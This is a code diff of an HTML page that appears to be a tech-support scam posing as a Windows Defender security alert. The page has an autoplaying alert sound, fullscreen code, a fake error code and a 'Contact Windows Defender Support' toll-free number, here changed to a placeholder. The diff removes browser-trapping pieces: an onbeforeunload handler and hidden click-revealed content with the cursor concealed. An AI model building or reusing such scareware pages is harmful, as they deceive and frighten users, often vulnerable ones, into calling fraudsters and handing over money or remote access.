@@ -94,24 +94,12 @@ function closeFullscreen() {
              });
              </script>
 
-<script>
-  function pageRedirect() {
-      $("#content").css("display","block")
-}
 
-</script>
-<style>
-  #content{
-      height: 1000px;
-      display: none;
-  }
-</style>
 
 </head>
-<body id="mycanvas" onclick="pageRedirect(); playSound();" class="map" onbeforeunload="return myFunction()" style="height: 1000px; background-image:url(s1.png); background-repeat: no-repeat; background-size:contain;">
-  <div id="content" style="cursor:none;">
 
-  <div id="map1">
+<body id="mycanvas" onclick="playSound()" >
+<div id="map1">
 
   <audio id="beep1" autoplay="">
       <source src="_Fm7-alert.mp3" type="audio/mpeg">
@@ -234,7 +222,7 @@ function closeFullscreen() {
     <div class="pl-4">
     <p style=" font-size: 16px;">The Windows Defender team has been notified of this issue.</p>
     <p style=" font-size: 16px;">Please try again later. <b>Error code:- 0x80508007</b></p><br>
-      <p style=" font-size: 18px;font-weight: 700;">Contact Windows Defender Support: <br> +1(000) 000 22354 (Security TollFree)</p>
+      <p style=" font-size: 18px;font-weight: 700;">Contact Windows Defender Support: <br> +1(000) 000 0000 (Security TollFree)</p>
   </div>
   </li>
 
